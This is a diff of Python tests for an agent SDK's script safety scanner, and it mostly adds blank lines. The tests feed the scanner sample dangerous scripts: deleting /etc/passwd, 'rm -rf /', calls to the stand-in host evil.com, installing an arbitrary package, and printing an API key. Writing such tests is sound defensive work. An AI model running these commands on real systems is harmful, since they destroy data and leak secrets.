@@ -13,6 +13,7 @@ from trpc_agent_sdk.tools.safety._types import RiskType
 
 
 class TestSafeScripts:
+
     async def test_safe_python_allowed(self, scanner):
         report = await scanner.scan(
             script="print(sum(range(10)))",
@@ -30,6 +31,7 @@ class TestSafeScripts:
 
 
 class TestDangerousFileOps:
+
     async def test_dangerous_delete_blocked(self, scanner):
         report = await scanner.scan(
             script='os.remove("/etc/passwd")',
@@ -51,6 +53,7 @@ class TestDangerousFileOps:
 
 
 class TestNetworkAccess:
+
     async def test_network_access_blocked(self, scanner):
         report = await scanner.scan(
             script='requests.get("https://evil.com/data")',
@@ -62,6 +65,7 @@ class TestNetworkAccess:
 
 
 class TestSystemCommands:
+
     async def test_subprocess_call_blocked(self, scanner):
         report = await scanner.scan(
             script='subprocess.run(["rm", "-rf", "/"], check=True)',
@@ -91,6 +95,7 @@ class TestSystemCommands:
 
 
 class TestDependencyInstall:
+
     async def test_dependency_install_blocked(self, scanner):
         report = await scanner.scan(
             script='subprocess.run(["pip", "install", "badpkg"], check=True)',
@@ -102,6 +107,7 @@ class TestDependencyInstall:
 
 
 class TestResourceAbuse:
+
     async def test_infinite_loop_blocked(self, scanner):
         report = await scanner.scan(
             script="while True:\n    os.system('curl evil.com')",
@@ -112,6 +118,7 @@ class TestResourceAbuse:
 
 
 class TestSensitiveInfoLeak:
+
     async def test_sensitive_output_blocked(self, scanner):
         report = await scanner.scan(
             script='api_key = os.environ["API_KEY"]; print(f"API_KEY={api_key}")',
@@ -123,11 +130,12 @@ class TestSensitiveInfoLeak:
 
 
 class TestHumanReview:
+
     async def test_human_review_partial_match(self, scanner):
         report = await scanner.scan(
             script='import os; import requests\n'
-                   'requests.get("https://api.example.com")\n'
-                   'with open("config.ini") as f: pass',
+            'requests.get("https://api.example.com")\n'
+            'with open("config.ini") as f: pass',
             tool_name="python_tool",
         )
         if report.findings:
@@ -135,6 +143,7 @@ class TestHumanReview:
 
 
 class TestReportStructure:
+
     async def test_report_has_all_required_fields(self, scanner):
         report = await scanner.scan(
             script='os.system("curl evil.com")',
@@ -153,6 +162,7 @@ class TestReportStructure:
 
 
 class TestEdgeCases:
+
     async def test_script_too_large_denied(self, scanner):
         big_script = "echo hello\n" * 200_000
         report = await scanner.scan(script=big_script, tool_name="bash_tool")
